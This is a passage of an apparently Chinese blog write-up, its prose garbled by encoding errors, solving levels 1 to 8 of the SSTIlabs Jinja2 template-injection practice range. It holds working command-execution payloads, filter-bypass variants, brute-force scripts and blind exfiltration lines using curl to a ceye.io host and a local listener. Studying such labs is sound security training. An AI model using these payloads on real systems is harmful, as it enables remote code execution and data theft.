<p>æˆ‘ä»¬é™¤äº†çŸ¥é“äº†<code>linecache</code>ã€<code>os</code>å¯ä»¥è·å–åˆ°å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°ä»¥å¤–ï¼Œæˆ‘ä»¬å‰é¢è¿˜æåˆ°äº†ä¸€ä¸ª<code>__builtins__</code>å†…å»ºå‡½æ•°ï¼Œåœ¨pythonçš„å†…å»ºå‡½æ•°ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥è·å–åˆ°è¯¸å¦‚<code>eval</code>ç­‰æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ã€‚<br><strong>è¿˜æœ‰å…³äºå¯ä»¥åˆ©ç”¨çš„ç‰¹æ®Šå‡½æ•°çš„æ€»ç»“ï¼Œä¹Ÿæ˜¯æœ‰å¤§ä½¬è¿›è¡Œæ€»ç»“æ”¶é›†çš„</strong>ï¼š<a target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#%E7%89%B9%E6%AE%8A%E5%87%BD%E6%95%B0%E6%9F%A5%E6%89%BE">https://misakikata.github.io/</a></p>
<h2 id="SSTIlabs"><a href="#SSTIlabs" class="headerlink" title="SSTIlabs"></a>SSTIlabs</h2><p>é¶åœºåœ°å€ï¼š<a target="_blank" rel="noopener" href="https://github.com/X3NNY/sstilabs">https://github.com/X3NNY/sstilabs</a>ï¼Œå®‰è£…ä¹Ÿååˆ†ç®€å•ï¼Œå®‰è£…è¿‡flaskåï¼Œç›´æ¥åœ¨flasklabç›®å½•ä¸‹è¿è¡Œ<code>app.py</code>ï¼Œå³å¯åœ¨<a target="_blank" rel="noopener" href="http://127.0.0.1:5000/">http://127.0.0.1:5000/</a> æ‰“å¼€é¶åœºï¼ç¯å¢ƒï¼špython3.9</p>
<p><img src="https://gitee.com/m0re/picture/raw/master/img/20220107011452.png" loading="lazy"></p>
<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level-1"></a>Level-1</h3><p>æ­¤å…³å¡æ— wafï¼Œå°±æ˜¯ä¸€ä¸ªæœ‰æ¼æ´çš„ç‚¹ç»™å‡ºæ¥äº†ï¼Œè¦æ‹¿åˆ°flagã€‚<br>è¿™é‡Œæ‰¾å¯ä»¥åˆ©ç”¨çš„ç‰¹æ®Šå‡½æ•°ï¼Œçœ‹çš„ç¤¾åŒºé‡Œçš„å¸ˆå‚…æ˜¯å†™äº†è„šæœ¬æ¥æ‰¾çš„ï¼Œè¿™é‡Œä¹Ÿå‚è€ƒä¸‹ï¼Œåˆ©ç”¨è„šæœ¬æ¥è¿›è¡ŒæŸ¥æ‰¾ã€‚</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:5000/level/1"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> <span class="token string">'&#123;&#123;"".__class__.__base__.__subclasses__()['</span><span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">']&#125;&#125;'</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token comment">#print(data)</span>
        <span class="token comment">#print(response.text)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token string">"_wrap_close"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">"----->"</span><span class="token punctuation">,</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
    <span class="token keyword">except</span> <span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
<span class="token comment"># 139 -----> Hello &amp;lt;class &amp;#39;os._wrap_close&amp;#39;&amp;gt;</span></code></pre>
<p>è¿™é‡Œè¿è¡Œå‡ºæ¥ï¼Œå‘ç°ç¬¬139å¯ä»¥ä½¿ç”¨ã€‚</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">139</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'type flag'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
<p>ç”±äºæˆ‘ç›´æ¥åœ¨Windowsç³»ç»Ÿä¸­è¿›è¡Œæ­å»ºï¼Œæ‰€ä»¥è¯»å–æ–‡ä»¶æ—¶ï¼Œè‡ªç„¶ä¹Ÿè¦ä½¿ç”¨Windowså‘½ä»¤ï¼Œä½¿ç”¨Linuxå‘½ä»¤è‡ªç„¶æ˜¯ä¸å¯è¡Œçš„ã€‚ä¸»è¦æ˜¯è¿™ä¸ªç»§æ‰¿å…³ç³»ï¼Œå‚æ•°ä¸å›ºå®šã€‚<br><img src="https://gitee.com/m0re/picture/raw/master/img/20220108005319.png" loading="lazy"></p>
<p>åœ¨pythonäº¤äº’å¼å‘½ä»¤è¡Œä¸­æ‰§è¡Œä¹Ÿæ˜¯æ²¡é—®é¢˜çš„<br><img src="https://gitee.com/m0re/picture/raw/master/img/20220108005424.png" loading="lazy"></p>
<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level-2"></a>Level-2</h3><p>ç¬¬äºŒå…³æè¿°æ˜¯banäº†<code>&#123;&#123;`ï¼Œå¯ä»¥ä½¿ç”¨`&#123;%%&#125;`æ¥ä»£æ›¿ã€‚
è¿™é‡Œä½¿ç”¨`&#123;%%&#125;`æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯`print()`æ ‡è®°ï¼Œå› ä¸ºä½¿ç”¨`&#123;%%&#125;`æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œæ‰€ä»¥æ‰éœ€è¦åŠ ä¸€ä¸ªprint()æ¥ä½¿å¾—å®ƒæœ‰å›æ˜¾ï¼Œæ¯”å¦‚ï¼š`&#123;%print(config)%&#125;`
æ‰€ä»¥è¿™é‡Œçš„payloadä¸º
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>%print<span class="token punctuation">(</span><span class="token string">""</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">139</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'type flag'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">))</span>%<span class="token punctuation">&#125;</span></code></pre>
![](https://gitee.com/m0re/picture/raw/master/img/20220108011732.png)
è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨è¯­å¥æ‹¼æ¥ï¼Œå½¢å¼åƒè¿™æ ·çš„ã€‚
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">433</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"curl <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>.xxxxx.ceye.io"</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span> %<span class="token punctuation">&#125;</span><span class="token number">1</span><span class="token punctuation">&#123;</span>% endif %<span class="token punctuation">&#125;</span></code></pre>
æ¨¡ä»¿ä¸€ä¸‹ä½¿ç”¨çš„æ˜¯
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% <span class="token keyword">if</span> <span class="token string">""</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">139</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span><span class="token string">"popen"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span> %<span class="token punctuation">&#125;</span>payload<span class="token punctuation">&#123;</span>% endif %<span class="token punctuation">&#125;</span></code></pre>
è¿™æ˜¯ä¸¤ç§å½¢å¼ï¼Œé‚£ä¹ˆåœ¨æ¯”èµ›ä¸­ï¼Œæˆ–è€…CTFé¢˜ç›®å½“ä¸­ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨è„šæœ¬æ¥è¿›è¡Œç›²æ³¨ã€‚
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:5000/level/2"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> <span class="token string">'&#123;% if "".__class__.__base__.__subclasses__()['</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'].__init__.__globals__["popen"]("type flag").read() %&#125;test&#123;% endif %&#125;'</span><span class="token punctuation">&#125;</span>
        <span class="token comment"># data = &#123;"code": '&#123;% print("".__class__.__base__.__subclasses__()[' + str(i) + '].__init__.__globals__["popen"]("type flag").read()) %&#125;'&#125;</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token string">"test"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">"--->"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
    <span class="token keyword">except</span> <span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
<span class="token comment"># 139 ---> &#123;'code': '&#123;% if "".__class__.__base__.__subclasses__()[139].__init__.__globals__["popen"]("type flag").read() %&#125;test&#123;% endif %&#125;'&#125;</span></code></pre>
ç›²æ³¨æ–¹å¼å¦‚ä¸Šã€‚çŒœè§£å¯ä»¥åˆ©ç”¨çš„ç‰¹æ®Šå‡½æ•°åºå·è€Œå·²ï¼Œä¹Ÿä¸æ˜¯ä»€ä¹ˆæœ‰éš¾åº¦çš„è„šæœ¬ã€‚
### Level-3
ç¬¬ä¸‰å…³çš„æè¿°æ˜¯
> no waf and blind

æµ‹è¯•å‘ç°åœ¨payloadæ„é€ æ­£ç¡®æ—¶ï¼Œä¸ä¼šè¿”å›æ‰§è¡Œçš„å†…å®¹äº†ï¼Œè€Œæ˜¯correctï¼Œåä¹‹é”™è¯¯æ—¶åˆ™è¿”å›wrongã€‚
![](https://gitee.com/m0re/picture/raw/master/img/20220108012936.png)
è¿™ä¸ªä¹Ÿæ˜¯ä½¿ç”¨ç›²æ³¨ï¼Œä½†æ˜¯éœ€è¦å¼€å¯ä¸€ä¸ªæœåŠ¡å™¨ï¼Œè¿™ä¸ªå¯ä»¥åœ¨æœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œè¿›è¡Œåå¼¹ä¿¡æ¯ã€‚
![](https://gitee.com/m0re/picture/raw/master/img/20220108013339.png)
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:5000/level/3"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> <span class="token string">'&#123;&#123;"".__class__.__base__.__subclasses__()['</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'].__init__.__globals__["popen"]("curl http://127.0.0.1:9000/`cat flag`").read()&#125;&#125;'</span><span class="token punctuation">&#125;</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">except</span> <span class="token punctuation">:</span>
        <span class="token keyword">pass</span></code></pre>
![](https://gitee.com/m0re/picture/raw/master/img/20220108013631.png)

ç”±äºç¯å¢ƒæ­å»ºåœ¨Windowsç³»ç»Ÿä¸Šï¼Œä¸¤ä¸ªåå¼•å·ä¸èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ï¼Œæ‰€ä»¥å°±æ— æ³•æ­£ç¡®è¿”å›å†…å®¹ï¼Œå¯¹äºLinuxç³»ç»Ÿçš„ç¯å¢ƒï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯å®Œå…¨æ²¡é—®é¢˜çš„ã€‚

### Level-4
> bl['[', ']']

è¿‡æ»¤äº†ä¸­æ‹¬å·ï¼Œä½¿ç”¨`__getitem__()`ç»•è¿‡
ä¿®æ”¹payloadå³å¯
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">139</span><span class="token punctuation">]</span>.__init__.__globals__.__getitem__<span class="token punctuation">(</span><span class="token string">'popen'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'type flag'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>

### Level-5
> è¿‡æ»¤å¼•å· å•åŒå¼•å·

å…¶ä¸­ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨`request.args`æ¥ç»•è¿‡
> åœ¨æ­å»ºflaskæ—¶,å¤§å¤šæ•°ç¨‹åºå†…éƒ¨éƒ½ä¼šä½¿ç”¨ flaskçš„requestæ¥è§£ægetè¯·æ±‚.æ­¤å‡ºæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ„é€ å¸¦å‚æ•°çš„url,é…åˆ request.args è·å–æ„é€ å‚æ•°çš„å†…å®¹æ¥ç»•è¿‡é™åˆ¶

<pre class="language-bash" data-language="bash"><code class="language-bash">get: <span class="token assign-left variable">a</span><span class="token operator">=</span>popen<span class="token operator">&amp;</span><span class="token assign-left variable">b</span><span class="token operator">=</span>type flag
post: <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">139</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span>request.args.a<span class="token punctuation">]</span><span class="token punctuation">(</span>request.args.b<span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
![](https://gitee.com/m0re/picture/raw/master/img/20220110122143.png)

### Level-6
è¿‡æ»¤çš„æ˜¯ä¸‹åˆ’çº¿ï¼Œæ‰€ä»¥å¾ˆå¤šä½¿ç”¨ä¸‹åˆ’çº¿è¿æ¥çš„è¯­å¥éƒ½éœ€è¦ä¿®æ”¹ç»•è¿‡ã€‚
ä½¿ç”¨è¿‡æ»¤å™¨`| attr()`ç»•è¿‡
è¿‡æ»¤å™¨
> 1. è¿‡æ»¤å™¨é€šè¿‡ç®¡é“ç¬¦å·ï¼ˆ|ï¼‰ä¸å˜é‡è¿æ¥,å¹¶ä¸”åœ¨æ‹¬å·ä¸­å¯èƒ½æœ‰å¯é€‰çš„å‚æ•°
> 2. å¯ä»¥é“¾æ¥åˆ°å¤šä¸ªè¿‡æ»¤å™¨.ä¸€ä¸ªæ»¤æ³¢å™¨çš„è¾“å‡ºå°†åº”ç”¨äºä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨.

ç»å¸¸ä½¿ç”¨çš„è¿‡æ»¤å™¨
<pre class="language-bash" data-language="bash"><code class="language-bash">length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># è·å–ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦å¹¶å°†å…¶è¿”å›</span>

int<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼š<span class="token comment"># å°†å€¼è½¬æ¢ä¸ºintç±»å‹ï¼›</span>

float<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼š<span class="token comment"># å°†å€¼è½¬æ¢ä¸ºfloatç±»å‹ï¼›</span>

lower<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼š<span class="token comment"># å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼›</span>

upper<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼š<span class="token comment"># å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ï¼›</span>

reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼š<span class="token comment"># åè½¬å­—ç¬¦ä¸²ï¼›</span>

replace<span class="token punctuation">(</span>value,old,new<span class="token punctuation">)</span>ï¼š <span class="token comment"># å°†valueä¸­çš„oldæ›¿æ¢ä¸ºnew</span>

list<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼š<span class="token comment"># å°†å˜é‡è½¬æ¢ä¸ºåˆ—è¡¨ç±»å‹ï¼›</span>

string<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼š<span class="token comment"># å°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ç±»å‹ï¼›</span>

join<span class="token punctuation">(</span><span class="token punctuation">)</span>ï¼š<span class="token comment"># å°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²,é€šå¸¸æœ‰pythonå†…ç½®çš„dict()é…åˆä½¿ç”¨</span>

attr<span class="token punctuation">(</span><span class="token punctuation">)</span>: <span class="token comment"># è·å–å¯¹è±¡çš„å±æ€§</span></code></pre>
`_`çš„åå…­è¿›åˆ¶ç¼–ç ä¸º`\x5f`
æ‰€ä»¥`__class__`å¯ä»¥å†™æˆ`\x5f\x5fclass\x5f\x5f`
è¿™ä¸€å…³å¯ä»¥ä½¿ç”¨ç¼–ç ç»•è¿‡ï¼Œåå…­è¿›åˆ¶ç¼–ç å’ŒUnicodeç¼–ç éƒ½å¯ä»¥ï¼Œä»¥åŠbase64ç¼–ç å’Œrot13ç­‰ç¼–ç å»ç»•è¿‡ã€‚
ä½†æ˜¯ç¼–ç è¿‡åçš„`_`ä¸èƒ½ç›´æ¥ä¸`.`è¿æ¥ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™éœ€è¦ä½¿ç”¨åˆ°è¿‡æ»¤å™¨è¿›è¡Œè¿æ¥ï¼Œè¿‡æ»¤å™¨çš„ç”¨æ³•æ˜¯`foo|attr("bar")`,ç»“æœç­‰ä»·äº`foo.bar`
è¿™ä¸€å…³çš„payload
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span><span class="token punctuation">)</span>.__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">139</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'type flag'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># ç¼–ç å</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>class<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>base<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>subclasses<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>getitem<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">139</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>init<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>globals<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>getitem<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'popen'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'type flag'</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
![](https://gitee.com/m0re/picture/raw/master/img/20220110123912.png)
å…¶ä»–ç¼–ç 
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># base64</span>
<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>class<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>base<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>subclasses<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>getitem<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">139</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>init<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>globals<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>getitem<span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x5f">\x5f</span>"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'popen'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'dHlwZSBmbGFn'</span>.decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">))</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
å•åŒå¼•å·å†…çš„å†…å®¹éƒ½èƒ½è¢«ç¼–ç ã€‚
### Level-7
è¿‡æ»¤äº†`.`ï¼Œå¯ä»¥ä½¿ç”¨`[]`ç»•è¿‡ã€‚
> pythonè¯­æ³•é™¤äº†å¯ä»¥ä½¿ç”¨ç‚¹ .æ¥è®¿é—®å¯¹è±¡å±æ€§å¤–,è¿˜å¯ä»¥ä½¿ç”¨ä¸­æ‹¬å·[].åŒæ ·ä¹Ÿå¯ä»¥ä½¿ç”¨__getitem__

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'__class__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__base__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__subclasses__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">139</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__init__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__globals__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'type flag'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
### Level-8
> bl["class", "arg", "form", "value", "data", "request", "init", "global", "open", "mro", "base", "attr"]

å…³é”®å­—è¿‡æ»¤ï¼Œæœ€ç®€å•çš„åŠæ³•å°±æ˜¯å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œæ¯”å¦‚`'class'`å¯ä»¥å†™æˆ`'cla''ss'`
**å…¶ä»–æ–¹æ³•**
1. ç¼–ç 
